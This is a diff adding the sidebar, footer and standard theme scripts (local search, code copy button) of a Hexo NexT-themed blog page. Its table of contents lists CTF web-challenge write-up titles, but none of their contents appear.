+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SHCTF"><span class="nav-number">1.</span> <span class="nav-text">SHCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK1-%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98"><span class="nav-number">1.1.</span> <span class="nav-text">[WEEK1]飞机大战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK1-ezphp"><span class="nav-number">1.2.</span> <span class="nav-text">[WEEK1]ezphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK1-ez-serialize"><span class="nav-number">1.3.</span> <span class="nav-text">[WEEK1]ez_serialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK1-1zzphp"><span class="nav-number">1.4.</span> <span class="nav-text">[WEEK1]1zzphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK2-serialize"><span class="nav-number">1.5.</span> <span class="nav-text">[WEEK2]serialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEEK1-%E7%94%9F%E6%88%90%E4%BD%A0%E7%9A%84%E9%82%80%E8%AF%B7%E5%87%BD%E5%90%A7"><span class="nav-number">1.6.</span> <span class="nav-text">[WEEK1]生成你的邀请函吧~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xgame"><span class="nav-number">1.7.</span> <span class="nav-text">0xgame</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Week-1-baby-php"><span class="nav-number">1.7.1.</span> <span class="nav-text">[Week 1] baby_php</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzklov</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('Copied')
+          else $(this).text('Copy failed')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('Copy')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+ 
+</body>
+</html>
